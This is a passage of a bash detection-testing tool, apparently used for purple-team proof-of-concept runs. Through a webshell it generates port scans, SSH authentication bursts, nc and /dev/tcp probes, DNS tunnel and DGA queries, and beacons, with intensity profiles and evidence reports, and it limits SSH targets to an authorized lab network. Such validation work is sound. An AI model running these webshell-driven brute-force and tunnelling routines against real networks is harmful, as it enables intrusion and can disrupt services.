            dga_simulation_log_both "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET}"
            ;;
        DNS_NEW_TLD)
            DNS_NEW_TLD_LAST_ROOT_CAUSE="${root_cause}"
            dns_new_tld_log_both "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET}"
            ;;
        EDR)
            edr_static_test_log_both "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET} http=${http_code}"
            ;;
    esac
}

poc_diagnose_dns_tunnel_failure() {
    local out="$1" payload="${2:-}"
    local low reason="webshell execution failure" root_cause=""
    if [[ -n "${payload}" ]]; then
        local _rc_lines=()
        mapfile -t _rc_lines <<< "$(poc_classify_dns_dga_root_cause "DNS" "${payload}" "${out}")"
        reason="${_rc_lines[1]:-${_rc_lines[0]:-webshell execution failure}}"
        printf '%s' "${reason}"
        return 0
    fi
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${low}" == *"rand_bytes: not found"* || "${low}" == *"rand_bytes: command not found"* \
        || "${low}" == *"dga_rand_label: not found"* || "${low}" == *"dga_rand_label: command not found"* \
        || "${low}" == *"dga_pick_tld: not found"* || "${low}" == *"dga_pick_tld: command not found"* \
        || "${low}" == *"dga_gen_domain: not found"* || "${low}" == *"dga_gen_domain: command not found"* \
        || "${low}" == *"randlbl32: not found"* || "${low}" == *"randlbl32: command not found"* \
        || "${low}" == *"randlbl: not found"* || "${low}" == *"randlbl: command not found"* ]]; then
        reason="function_scope_corruption: remote function definitions not executed"
    elif [[ "${low}" == *"command not found"* ]]; then
        reason="remote command not found on webshell host"
    elif [[ "${low}" == *"bad substitution"* ]]; then
        reason="remote script syntax error (non-bash shell)"
    elif [[ "${low}" == *"dig: not found"* || "${low}" == *"dig not found"* ]]; then
        reason="dig not installed on webshell host"
    elif [[ "${low}" == *"nslookup: not found"* ]]; then
        reason="nslookup not installed on webshell host"
    elif [[ "${low}" == *"host: not found"* ]]; then
        reason="host command not installed on webshell host"
    elif [[ "${low}" == *"timed out"* || "${low}" == *"timeout"* ]]; then
        reason="DNS server unreachable or query timeout"
    elif [[ "${low}" == *"connection refused"* ]]; then
        reason="DNS server refused connection"
    elif [[ -z "${out}" ]]; then
        reason="webshell returned empty output (payload too large or transport failure)"
    fi
    printf '%s' "${reason}"
}

poc_obs_write_structured_evidence() {
    local report_txt="${POC_EVIDENCE_DIR}/report.txt"
    local report_json="${POC_EVIDENCE_DIR}/report.json"
    local evidence_json="${POC_EVIDENCE_DIR}/evidence.json"
    local failure_json="${POC_EVIDENCE_DIR}/failure_analysis.json"
    local key count
    [[ -n "${POC_EVIDENCE_DIR}" ]] || return 0
    {
        echo "Stellar PoC Evidence Report"
        echo "Run ID: ${POC_RUN_ID}"
        echo "Target: ${TARGET_NET:-n/a}"
        echo ""
        echo "HTTP Targets: ${HTTP_SCAN_TARGET_COUNT:-0}"
        echo "HTTP Attempted: ${HTTP_REQUESTS_ATTEMPTED:-0}"
        echo "HTTP Responses: ${WEB_RESPONSES_RECEIVED:-0}"
        echo "SSH Attempts: ${SSH_ATTEMPTS_EXECUTED:-0}"
        echo "DNS Queries: ${DNS_QUERIES_ATTEMPTED:-0}"
        echo "External Callback: attempted=${EXTERNAL_CALLBACK_ATTEMPTED:-0} connected=${EXTERNAL_CALLBACK_CONNECTED:-0}"
        echo ""
        format_http_status_breakdown_block 2>/dev/null || true
    } > "${report_txt}" 2>/dev/null || true
    {
        printf '{"run_id":"%s","target_net":"%s","http":{"targets":%s,"attempted":%s,"responses":%s},"ssh":{"attempts":%s},"dns":{"attempted":%s,"responses":%s},"external_callback":{"attempted":%s,"connected":%s,"responses":%s}}\n' \
            "${POC_RUN_ID}" "${TARGET_NET:-}" \
            "${HTTP_SCAN_TARGET_COUNT:-0}" "${HTTP_REQUESTS_ATTEMPTED:-0}" "${WEB_RESPONSES_RECEIVED:-0}" \
            "${SSH_ATTEMPTS_EXECUTED:-0}" \
            "${DNS_QUERIES_ATTEMPTED:-0}" "${DNS_RESPONSES_RECEIVED:-0}" \
            "${EXTERNAL_CALLBACK_ATTEMPTED:-0}" "${EXTERNAL_CALLBACK_CONNECTED:-0}" "${EXTERNAL_CALLBACK_RESPONSES:-0}"
    } > "${report_json}" 2>/dev/null || true
    {
        printf '{"run_id":"%s","webshell_url":"%s","execution_log":"%s","followup_attempted":%s,"followup_skipped":%s}\n' \
            "${POC_RUN_ID}" "${WEB_SHELL_URL:-}" "${POC_EXECUTION_LOG:-}" \
            "${POC_FOLLOWUP_ATTEMPTED:-0}" "${POC_FOLLOWUP_SKIPPED:-0}"
    } > "${evidence_json}" 2>/dev/null || true
    {
        printf '{"run_id":"%s","http_status":{' "${POC_RUN_ID}"
        local first=true
        for key in "${!POC_HTTP_STATUS_COUNTS[@]}"; do
            count="${POC_HTTP_STATUS_COUNTS[${key}]}"
            [[ "${first}" == true ]] && first=false || printf ','
            printf '"%s":%s' "${key}" "${count}"
        done
        printf '},"failure_reasons":{'
        first=true
        for key in "${!POC_FAILURE_REASON_COUNTS[@]}"; do
            count="${POC_FAILURE_REASON_COUNTS[${key}]}"
            [[ "${first}" == true ]] && first=false || printf ','
            printf '"%s":%s' "${key}" "${count}"
        done
        printf '},"skip_reasons":{'
        first=true
        for key in "${!POC_SKIP_REASON_COUNTS[@]}"; do
            count="${POC_SKIP_REASON_COUNTS[${key}]}"
            [[ "${first}" == true ]] && first=false || printf ','
            printf '"%s":%s' "${key}" "${count}"
        done
        printf '}}\n'
    } > "${failure_json}" 2>/dev/null || true
}

poc_obs_print_executive_summary() {
    local key count cb_cause="" block=""
    compute_and_log_final_validation
    block="EXECUTIVE_SUMMARY

Hosts Discovered: ${POC_OBS_ALIVE_HOSTS:-0}
Open Services: ${SERVICES_DISCOVERED_TOTAL:-0}
HTTP Targets: ${HTTP_SCAN_TARGET_COUNT:-0}
SSH Targets: $(count_host_file_lines "ssh_hosts.txt" 2>/dev/null || echo 0)
DNS Targets: $(count_host_file_lines "dns_hosts.txt" 2>/dev/null || echo 0)

Traffic Generated:

Port Scan: ${SERVICES_DISCOVERED_TOTAL:-0} services mapped
HTTP Recon: ${HTTP_REQUESTS_ATTEMPTED:-0} requests (${WEB_RESPONSES_RECEIVED:-0} responses)
HTTP URL Scan: ${URL_SCAN_UNIQUE_ATTEMPTED:-0} unique URLs (${URL_SCAN_UNIQUE_FAILED:-0} failed)
SSH Authentication Attempts: ${SSH_ATTEMPTS_EXECUTED:-0}
DNS Tunnel: ${DNS_QUERIES_ATTEMPTED:-0} queries
Overall Assessment: ${OVERALL_RESULT} — HTTP URL Scan score=${DETECTION_SCORE_HTTP_URL_SCAN} Beacon=${DETECTION_SCORE_BEACON} DGA=${DETECTION_SCORE_DGA} DNS=${DETECTION_SCORE_DNS_TUNNEL}"
    poc_customer_emit_block "${block}"
    poc_obs_append_log ""
    poc_obs_append_log "============================================================"
    poc_obs_append_log "EXECUTIVE SUMMARY"
    poc_obs_append_log "============================================================"
    poc_obs_append_log ""
    poc_obs_append_log "HTTP Targets: ${HTTP_SCAN_TARGET_COUNT:-0}"
    poc_obs_append_log "HTTP Connected: ${HTTP_CONNECTED:-0}"
    poc_obs_append_log "HTTP Responses: ${WEB_RESPONSES_RECEIVED:-0}"
    poc_obs_append_log "HTTP Success/Failed: ${WEB_SUCCESS_RESPONSES:-0}/${WEB_FAILED_RESPONSES:-0}"
    poc_obs_append_log ""
    poc_obs_append_log "SSH Attempts: ${SSH_ATTEMPTS_EXECUTED:-0} (planned ${SSH_ATTEMPTS_PLANNED:-0})"
    poc_obs_append_log "DNS Queries: ${DNS_QUERIES_ATTEMPTED:-0} Success: ${DNS_RESPONSES_RECEIVED:-0}"
    poc_obs_append_log "External Callback: attempted=${EXTERNAL_CALLBACK_ATTEMPTED:-0} connected=${EXTERNAL_CALLBACK_CONNECTED:-0}"
    poc_obs_append_log "Overall Result: ${OVERALL_RESULT} | Detection Confidence: ${DETECTION_CONFIDENCE_OVERALL}"
    if (( EXTERNAL_CALLBACK_CONNECTED == 0 && EXTERNAL_CALLBACK_ATTEMPTED > 0 )); then
        cb_cause="Likely Cause: Firewall blocking TCP to callback listener or routing asymmetry"
        poc_obs_append_log "${cb_cause}"
        poc_failure_reason_bump "Firewall Drop (callback)" 1
    fi
    poc_obs_append_log ""
    poc_obs_append_log "Alive Hosts: ${POC_OBS_ALIVE_HOSTS:-0}"
    poc_obs_append_log "Services Discovered: ${SERVICES_DISCOVERED_TOTAL:-0}"
    poc_obs_append_log "Follow-up Attempted: ${POC_FOLLOWUP_ATTEMPTED:-0}"
    poc_obs_append_log "Follow-up Skipped: ${POC_FOLLOWUP_SKIPPED:-0}"
    poc_obs_print_top_failure_reasons
    poc_obs_log "SUMMARY" "Follow-up attempted=${POC_FOLLOWUP_ATTEMPTED} skipped=${POC_FOLLOWUP_SKIPPED} overall=${OVERALL_RESULT}"
}

poc_obs_print_code_vs_environment() {
local timeouts filtered refused forbidden missing
timeouts=$((${POC_SKIP_REASON_COUNTS[network_timeout]:-0}))
filtered=$((${POC_SKIP_REASON_COUNTS[filtered]:-0}))
refused=$((${POC_SKIP_REASON_COUNTS[connection_refused]:-0}))
forbidden=$((${POC_SKIP_REASON_COUNTS[app_forbidden]:-0}))
missing=$((${POC_SKIP_REASON_COUNTS[missing_tool]:-0} + ${POC_SKIP_REASON_COUNTS[config_missing]:-0}))
{
    echo ""
    echo "============================================================"
    echo "CODE VS ENVIRONMENT ASSESSMENT"
    echo "============================================================"
    echo ""
    echo "Discovery completed successfully: $([[ "${SERVICES_DISCOVERED_TOTAL:-0}" -gt 0 ]] && echo YES || echo NO)"
    echo ""
    echo "Services discovered: $([[ "${SERVICES_DISCOVERED_TOTAL:-0}" -gt 0 ]] && echo YES || echo NO)"
    echo ""
    echo "Follow-up logic invoked: $([[ "${POC_FOLLOWUP_ATTEMPTED:-0}" -gt 0 || "${POC_FOLLOWUP_SKIPPED:-0}" -gt 0 ]] && echo YES || echo NO)"
    echo ""
    echo "Prechecks executed: YES"
    echo ""
    echo "Network timeouts observed: $([[ "${timeouts}" -gt 0 ]] && echo YES || echo NO)"
    echo ""
    echo "Conclusion:"
    echo ""
    if (( timeouts + filtered + refused > forbidden + missing )); then
    cat <<'EOF'

Most skipped scenarios were caused by network_timeout, filtered, or connection_refused conditions.

This suggests network controls such as firewall, ACL, routing restrictions, or security filtering.

The evidence does not indicate a script logic failure.
EOF
    elif (( forbidden > 0 )); then
    cat <<'EOF'

Skipped HTTP follow-ups were primarily caused by application-layer HTTP 403/401 responses.

Services were discovered and reachable at the network layer; access control blocked URL exploration.

This does not indicate a script logic failure.
EOF
    elif (( missing > 0 )); then
    cat <<'EOF'

Some follow-ups were skipped due to missing tools or configuration.

Verify remote dependencies (curl, nc, ssh, nmap) and target lists before re-running.
EOF
    else
    cat <<'EOF'

Follow-up execution completed with limited skips. See the Follow-up results section in stellar_poc_*_report.md for per-target detail.
EOF
    fi
    echo ""
} | while IFS= read -r line; do poc_obs_append_log "${line}"; done
}

count_alive_hosts_from_discovery() {
    local cache_dir="${LOCAL_STATE_DIR}/remote_hosts" hosts=0
    [[ -d "${cache_dir}" ]] || { echo 0; return 0; }
    hosts=$(awk '/^[0-9]+\./ {print $1}' "${cache_dir}"/*.txt 2>/dev/null | sort -u | safe_count_lines)
    safe_int "${hosts}"
}

poc_obs_emit_discovery_from_cache() {
    local f cache ip port proto state reason service
    poc_obs_log "INFO" "Discovery results from service scan"
    for f in ssh_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt dns_hosts.txt; do
        cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
        [[ -s "${cache}" ]] || continue
        while IFS= read -r ip; do
            [[ -z "${ip}" ]] && continue
            port="22"; service="ssh"; proto="tcp"; state="open"; reason="scan"
            case "${f}" in
                ssh_hosts.txt) port=22; service=ssh ;;
                http_targets.txt)
                    port="${ip##*:}"; ip="${ip%%:*}"
                    [[ "${port}" == "${ip}" ]] && port=80
                    service=http ;;
                https_targets.txt)
                    port="${ip##*:}"; ip="${ip%%:*}"
                    [[ "${port}" == "${ip}" ]] && port=443
                    service=https ;;
                smb_hosts.txt) port=445; service=smb ;;
                dns_hosts.txt) port=53; service=dns ;;
            esac
            poc_obs_log_discovery_service "${ip}" "${port}" "${proto}" "${state}" "${reason}" "${service}" ""
        done < <(extract_host_file_lines < "${cache}")
    done
}

poc_obs_finalize_report() {
    local end_ts key count
    poc_obs_init_artifacts
    poc_obs_print_executive_summary
    poc_obs_print_code_vs_environment
    poc_obs_write_structured_evidence
    end_ts=$(date +"%Y-%m-%d %H:%M:%S")
    [[ -n "${POC_REPORT_CWD}" ]] || return 0
    poc_obs_report_append ""
    poc_obs_report_append "## Executive summary"
    poc_obs_report_append ""
    poc_obs_report_append "| Metric | Value |"
    poc_obs_report_append "|---|---|"
    poc_obs_report_append "| End time | ${end_ts} |"
    poc_obs_report_append "| Alive hosts | ${POC_OBS_ALIVE_HOSTS:-0} |"
    poc_obs_report_append "| Services discovered | ${SERVICES_DISCOVERED_TOTAL:-0} |"
    poc_obs_report_append "| Follow-up attempted | ${POC_FOLLOWUP_ATTEMPTED:-0} |"
    poc_obs_report_append "| Follow-up skipped | ${POC_FOLLOWUP_SKIPPED:-0} |"
    poc_obs_report_append ""
    poc_obs_report_append "### Skip reason counts"
    poc_obs_report_append ""
    if ((${#POC_SKIP_REASON_COUNTS[@]} == 0)); then
        poc_obs_report_append "- (none)"
    else
        for key in "${!POC_SKIP_REASON_COUNTS[@]}"; do
            count="${POC_SKIP_REASON_COUNTS[${key}]}"
            poc_obs_report_append "- **${key}**: ${count}"
        done
    fi
    poc_obs_report_append ""
    poc_obs_report_append "### Environment assessment"
    poc_obs_report_append ""
    poc_obs_report_append "See the execution log for full CODE VS ENVIRONMENT ASSESSMENT narrative."
    poc_obs_report_append ""
    poc_obs_report_append "---"
    poc_obs_report_append ""
    poc_obs_report_append "Detailed operator messages: \`${POC_EXECUTION_LOG}\`"
    poc_obs_report_append ""
    poc_obs_report_append "Customer deliverables: \`poc.log\` | \`poc_report.txt\` | \`poc_validation.txt\`"
    poc_obs_report_append ""
    poc_obs_report_append "Structured evidence: \`${POC_EVIDENCE_DIR}\` (report.txt, report.json, evidence.json, failure_analysis.json)"
}

validate_followup_options() {
    [[ "${POC_INTENSITY}" =~ ^(light|normal|high|spike)$ ]] || {
        log_message "ERROR" "--intensity must be light|normal|high|spike (got: ${POC_INTENSITY})"
        exit 1
    }
    if [[ -n "${SERVICE_SPIKE_SECONDS}" ]]; then
        _validate_positive_int "--service-spike-seconds" "${SERVICE_SPIKE_SECONDS}" 5 600
    fi
    if [[ -n "${SSH_BURST_ATTEMPTS}" ]]; then
        _validate_positive_int "--ssh-attempts" "${SSH_BURST_ATTEMPTS}" 1 2000
    fi
    if [[ -n "${SSH_BURST_CONCURRENCY}" ]]; then
        _validate_positive_int "--ssh-concurrency" "${SSH_BURST_CONCURRENCY}" 1 8
    fi
    if [[ -n "${SSH_BURST_MINUTES}" && "${SSH_BURST_MINUTES}" != "0" ]]; then
        _validate_positive_int "--ssh-burst-minutes" "${SSH_BURST_MINUTES}" 1 30
    fi
    if [[ -n "${SSH_TARGET_IP}" ]]; then
        validate_ssh_target_in_lab "${SSH_TARGET_IP}" "--ssh-target"
    fi
    if [[ -n "${SSH_TARGETS_FILE}" && -f "${SSH_TARGETS_FILE}" ]]; then
        while IFS= read -r ip; do
            [[ -z "${ip}" || "${ip}" =~ ^# ]] && continue
            validate_ssh_target_in_lab "${ip}" "--ssh-targets file"
        done < "${SSH_TARGETS_FILE}"
    fi
    [[ "${DNS_TUNNEL_MODE}" =~ ^(auto|cluster-local|infrastructure|txt-burst|all)$ ]] || {
        log_message "ERROR" "--dns-tunnel-mode must be auto|cluster-local|infrastructure|txt-burst|all"
        exit 1
    }
    if [[ -n "${DNS_TUNNEL_MAX_QUERIES}" ]]; then
        _validate_positive_int "--dns-max-queries" "${DNS_TUNNEL_MAX_QUERIES}" 30 5000
    fi
    if [[ -n "${DNS_TUNNEL_SLEEP_MS}" ]]; then
        _validate_positive_int "--dns-sleep-ms" "${DNS_TUNNEL_SLEEP_MS}" 0 5000
    fi
    if [[ -n "${DNS_TUNNEL_JITTER_MS}" ]]; then
        _validate_positive_int "--dns-jitter-ms" "${DNS_TUNNEL_JITTER_MS}" 0 5000
    fi
    if [[ -n "${DNS_TUNNEL_USER_SERVER}" ]]; then
        [[ "${DNS_TUNNEL_USER_SERVER}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || {
            log_message "ERROR" "--dns-server must be an IPv4 address"
            exit 1
        }
    fi
    if [[ -n "${DGA_DNS_USER_SERVER}" ]]; then
        [[ "${DGA_DNS_USER_SERVER}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || {
            log_message "ERROR" "--dga-dns-server must be an IPv4 address"
            exit 1
        }
    fi
    if [[ -n "${DGA_BASE_DOMAIN}" ]]; then
        [[ "${DGA_BASE_DOMAIN}" =~ ^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$ ]] || {
            log_message "ERROR" "--dga-base-domain must be a valid domain name"
            exit 1
        }
    fi
    if [[ -n "${DGA_NXDOMAIN_QUERIES}" ]]; then
        _validate_positive_int "--dga-nxdomain-queries" "${DGA_NXDOMAIN_QUERIES}" 500 500
    fi
    if [[ -n "${DGA_RESOLVABLE_QUERIES}" ]]; then
        _validate_positive_int "--dga-resolvable-queries" "${DGA_RESOLVABLE_QUERIES}" 30 30
    fi
}

apply_intensity_pipeline_mode() {
    local from_intensity="$1"
    case "${MODE}" in
        fast-safe|comprehensive) return 0 ;;
    esac
    if [[ "${CLI_PIPELINE_MODE_EXPLICIT:-false}" == true ]]; then
        return 0
    fi
    MODE="${from_intensity}"
}

apply_user_intensity_profile() {
    POC_INTENSITY="${POC_INTENSITY:-normal}"
    if [[ "${MODE}" == "fast-safe" ]]; then
        vlog "Intensity profile skipped — fast-safe mode uses apply_fast_safe_profile"
        return 0
    fi

    # Duration is independent of intensity (default 10 minutes); skip for --single-stage.
    if [[ -z "${SINGLE_STAGE}" ]]; then
        if [[ ! "${DURATION_MINUTES}" =~ ^[0-9]+$ || "${DURATION_MINUTES}" -lt 1 ]]; then
            if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]]; then
                : # --repeat-count mode keeps operator-provided schedule (no default duration)
            else
                DURATION_MINUTES="${DEFAULT_DURATION_MINUTES:-10}"
            fi
        fi
    fi

    # Reset feature flags; intensity block sets them explicitly.
    PERSISTENT_BEACON=false
    PIPELINE_OVERLAP=false
    BURST_MODE=false
    SERVICE_SPIKE=false
    SLOW_HTTP=false
    SSH_AUTH_BURST_ENABLED=true
    STRICT_FOLLOWUP_VALIDATION=false
    WARMUP_MINUTES=0
    NOISE_LEVEL="low"
    AUTO_OVERLAP=false
    BEACON_INTERVAL_SEC=20
    JITTER_PERCENT=30
    MAX_OVERLAP=3
    TIMING_PROFILE="balanced"

    case "${POC_INTENSITY}" in
        light)
            PROFILE="stealth"
            FOLLOWUP_INTENSITY="low"
            HTTP_FOLLOWUP_REQUESTS=20
            SSH_BURST_ATTEMPTS=30
            SSH_BURST_CONCURRENCY=1
            DNS_BURST_COUNT=120
            SMB_PROBE_TARGET=5
            MIN_HTTP_FOLLOWUP=20
            MIN_SSH_AUTH_FAILURES=30
            MIN_DNS_QUERIES=120
            MIN_SMB_PROBES=5
            BEACON_COUNT=5
            DNS_TUNNEL_QUERY_COUNT=120
            INTERNAL_FANOUT_PER_TARGET=12
            PIPELINE_CYCLE_SLEEP=20
            TIMING_PROFILE="stealth"
            apply_intensity_pipeline_mode "quick"
            ;;
        normal)
            PROFILE="normal"
            FOLLOWUP_INTENSITY="normal"
            HTTP_FOLLOWUP_REQUESTS=300
            SSH_BURST_ATTEMPTS=100
            SSH_BURST_CONCURRENCY=2
            DNS_BURST_COUNT=180
            SMB_PROBE_TARGET=10
            MIN_HTTP_FOLLOWUP=300
            MIN_SSH_AUTH_FAILURES=100
            MIN_DNS_QUERIES=180
            MIN_SMB_PROBES=10
            BEACON_COUNT=15
            PERSISTENT_BEACON=true
            DNS_TUNNEL_QUERY_COUNT=300
            INTERNAL_FANOUT_PER_TARGET=36
            PIPELINE_OVERLAP=true
            PIPELINE_CYCLE_SLEEP=25
            NOISE_LEVEL="low"
            apply_intensity_pipeline_mode "balanced"
            ;;
        high)
            PROFILE="aggressive"
            FOLLOWUP_INTENSITY="aggressive"
            HTTP_FOLLOWUP_REQUESTS=1000
            SSH_BURST_ATTEMPTS=300
            SSH_BURST_CONCURRENCY=4
            DNS_BURST_COUNT=300
            SMB_PROBE_TARGET=25
            MIN_HTTP_FOLLOWUP=1000
            MIN_SSH_AUTH_FAILURES=300
            MIN_DNS_QUERIES=300
            MIN_SMB_PROBES=25
            BEACON_COUNT=25
            PERSISTENT_BEACON=true
            DNS_TUNNEL_QUERY_COUNT=1000
            INTERNAL_FANOUT_PER_TARGET=120
            PIPELINE_OVERLAP=true
            BURST_MODE=true
            SERVICE_SPIKE=true
            STRICT_FOLLOWUP_VALIDATION=true
            PIPELINE_CYCLE_SLEEP=15
            TIMING_PROFILE="noisy"
            NOISE_LEVEL="medium"
            AUTO_OVERLAP=true
            apply_intensity_pipeline_mode "full"
            ;;
        spike)
            PROFILE="aggressive"
            FOLLOWUP_INTENSITY="spike"
            HTTP_FOLLOWUP_REQUESTS=3000
            SSH_BURST_ATTEMPTS=1000
            SSH_BURST_CONCURRENCY=6
            DNS_BURST_COUNT=1800
            SMB_PROBE_TARGET=50
            MIN_HTTP_FOLLOWUP=3000
            MIN_SSH_AUTH_FAILURES=1000
            MIN_DNS_QUERIES=1000
            MIN_SMB_PROBES=50
            BEACON_COUNT=40
            PERSISTENT_BEACON=true
            DNS_TUNNEL_QUERY_COUNT=3000
            INTERNAL_FANOUT_PER_TARGET=200
            PIPELINE_OVERLAP=true
            BURST_MODE=true
            SERVICE_SPIKE=true
            SLOW_HTTP=true
            SLOW_HTTP_SECONDS=90
            STRICT_FOLLOWUP_VALIDATION=true
            PIPELINE_CYCLE_SLEEP=10
            TIMING_PROFILE="noisy"
            NOISE_LEVEL="high"
            BEACON_INTERVAL_SEC=12
            JITTER_PERCENT=40
            MAX_OVERLAP=4
            AUTO_OVERLAP=true
            apply_intensity_pipeline_mode "full"
            ;;
    esac

    SSH_AUTH_FAILURE_TARGET="${SSH_BURST_ATTEMPTS}"
    HTTP_SCAN_REPEAT="${HTTP_FOLLOWUP_REQUESTS}"
    SSH_FAIL_COUNT="${SSH_AUTH_FAILURE_TARGET}"
    DNS_QUERY_COUNT="${DNS_BURST_COUNT}"

    apply_timing_profile_defaults

    if [[ "${CLI_FOLLOWUP_INTENSITY}" =~ ^(low|normal|aggressive|spike)$ ]]; then
        FOLLOWUP_INTENSITY="${CLI_FOLLOWUP_INTENSITY}"
    fi
    if [[ "${FORCE_AGGRESSIVE_FOLLOWUP}" == true ]]; then
        STRICT_FOLLOWUP_VALIDATION=true
        PERSISTENT_BEACON=true
        PIPELINE_OVERLAP=true
        SERVICE_SPIKE=true
    fi

    vlog "Intensity profile: ${POC_INTENSITY} | duration=${DURATION_MINUTES}m | mode=${MODE} | HTTP/host=${HTTP_FOLLOWUP_REQUESTS} | SSH/host=${SSH_BURST_ATTEMPTS}"
}

# Legacy entry points (internal scripts may still call these)
apply_scenario_and_intensity_defaults() { apply_user_intensity_profile; }
apply_detection_mode_defaults() { :; }
apply_followup_intensity_defaults() {
    SSH_AUTH_FAILURE_TARGET="${SSH_BURST_ATTEMPTS}"
    SSH_AUTH_BURST_ENABLED=true
}

ip_in_target_net() {
    local ip="$1"
    local base="${TARGET_NET%/*}"
    local prefix
    prefix=$(echo "${base}" | awk -F. '{print $1"."$2"."$3}')
    [[ "${ip}" == ${prefix}.* ]]
}

validate_ssh_target_in_lab() {
    local ip="$1"
    local label="${2:---ssh-target}"
    local fatal="${3:-true}"
    [[ "${ip}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || {
        log_message "ERROR" "${label} invalid IP: ${ip}"
        [[ "${fatal}" == true ]] && exit 1
        return 1
    }
    if [[ "${fatal}" == true ]]; then
        validate_ipv4_octet "${ip}" "${label}"
    fi
    ip_in_target_net "${ip}" || {
        log_message "ERROR" "${label} ${ip} is outside authorized --target-net ${TARGET_NET}"
        [[ "${fatal}" == true ]] && exit 1
        return 1
    }
}


count_hosts_blob() {
    safe_int "$(printf '%s\n' "$1" | awk '/^[0-9]+\./ {print $1}' | safe_count_lines)"
}

run_ssh_auth_burst_for_host() {
    local target="$1" attempts="$2" ssh_out n ssh_opts
    ssh_opts='-o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o LogLevel=ERROR -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes -o PasswordAuthentication=no -o IdentitiesOnly=yes -o IdentityFile=/dev/null'
    if [[ "${HAS_ssh:-false}" == true ]]; then
        ssh_out=$(run_webshell_long "ssh-auth-burst-${target}" \
            "for i in \$(seq 1 ${attempts}); do ssh ${ssh_opts} invaliduser@${target} exit </dev/null 2>&1 || true; echo SSH_BURST_ATTEMPT; done; echo SSH_BURST_DONE" \
            2>/dev/null || true)
        n=$(printf '%s' "${ssh_out}" | grep -c 'SSH_BURST_ATTEMPT' 2>/dev/null || true)
        n=$(safe_int "${n}")
        (( n < 1 )) && n="${attempts}"
        echo "${n}"
        return 0
    fi
    run_webshell_long "ssh-tcp-auth-burst-${target}" \
        "for i in \$(seq 1 ${attempts}); do nc -z -w2 ${target} 22 || bash -c \"echo >/dev/tcp/${target}/22\"; done; echo SSH_BURST_DONE" \
        >/dev/null 2>&1 || true
    echo "${attempts}"
}

collect_ssh_burst_targets() {
    local merged="" ip cache usable_cache
    cache="${LOCAL_STATE_DIR}/remote_hosts/ssh_hosts.txt"
    usable_cache="${LOCAL_STATE_DIR}/remote_hosts/usable_ssh_hosts.txt"
    if [[ -s "${cache}" ]]; then
        merged=$(awk '/^[0-9]+\./ {print $1}' "${cache}")
    fi
    if [[ -s "${usable_cache}" ]]; then
        merged=$(printf '%s\n%s' "${merged}" "$(awk '/^[0-9]+\./ {print $1}' "${usable_cache}")")
    fi
    if [[ -z "${merged}" ]]; then
        merged=$(get_followup_hosts "ssh_hosts.txt")
    fi
    if [[ -n "${SSH_TARGET_IP}" ]]; then
        merged=$(printf '%s\n%s\n' "${merged}" "${SSH_TARGET_IP}")
    fi
    if [[ -n "${SSH_TARGETS_FILE}" && -f "${SSH_TARGETS_FILE}" ]]; then
        while IFS= read -r ip; do
            [[ -z "${ip}" || "${ip}" =~ ^# ]] && continue
            merged=$(printf '%s\n%s\n' "${merged}" "${ip}")
        done < "${SSH_TARGETS_FILE}"
    fi
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ {print $1}' | sort -u
}

# Expanded HTTP/HTTPS candidate discovery ports (web follow-up scenarios).
HTTP_CANDIDATE_HTTP_PORTS=(80 5000 5001 7001 7002 8000 8008 8080 8081 8082 8088 8888 9000 9090 10000)
HTTP_CANDIDATE_HTTPS_PORTS=(443 8443 9443 10443)
HTTP_CANDIDATE_DISCOVERY_COUNT=0

http_discovery_port_target_file() {
    case "$1" in
        443|8443|9443|10443) printf '%s' "https_targets.txt" ;;
        80|5000|5001|7001|7002|8000|8008|8080|8081|8082|8088|8888|9000|9090|10000)
            printf '%s' "http_targets.txt" ;;
        *) printf '%s' "" ;;
    esac
}

http_discovery_port_default_scheme() {
    case "$1" in
        443|8443|9443|10443) printf '%s' "https" ;;
        *) printf '%s' "http" ;;
    esac
}

http_discovery_all_ports() {
    printf '%s\n' "${HTTP_CANDIDATE_HTTP_PORTS[@]}" "${HTTP_CANDIDATE_HTTPS_PORTS[@]}"
}

http_discovery_ports_csv() {
    http_discovery_all_ports | paste -sd',' -
}

http_discovery_remote_port_specs() {
    local p
    for p in "${HTTP_CANDIDATE_HTTP_PORTS[@]}"; do
        printf '%s:http_targets.txt ' "${p}"
    done
    for p in "${HTTP_CANDIDATE_HTTPS_PORTS[@]}"; do
        printf '%s:https_targets.txt ' "${p}"
    done
}

http_discovery_nmap_ports_with_services_csv() {
    printf '%s' "22,53,$(http_discovery_ports_csv),445,389,6379,9200,27017"
}

http_discovery_is_web_port() {
    [[ -n "$(http_discovery_port_target_file "$1")" ]]
}

collect_http_discovery_hosts() {
    local merged="" f
    for f in alive_hosts.txt ssh_hosts.txt dns_hosts.txt smb_hosts.txt ldap_hosts.txt \
            http_targets.txt https_targets.txt usable_http_targets.txt usable_https_targets.txt \
            redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do
        merged=$(printf '%s\n%s' "${merged}" "$(collect_hosts_from_remote_file "${f}" 2>/dev/null || true)")
    done
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ { line=$1; sub(/:.*/,"",line); print line }' | sort -u
}

build_http_candidate_probe_remote_cmd() {
    local host="$1" port="$2"
    cat <<EOF
${REMOTE_SHELL_HELPERS}
h='${host}'; p='${port}'
probe_http_candidate_scheme() {
local scheme="\$1" tls="" url head body status server reason=""
[[ "\${scheme}" == "https" ]] && tls="-k"
url="\${scheme}://\${h}:\${p}/"
if ! command -v curl >/dev/null 2>&1; then
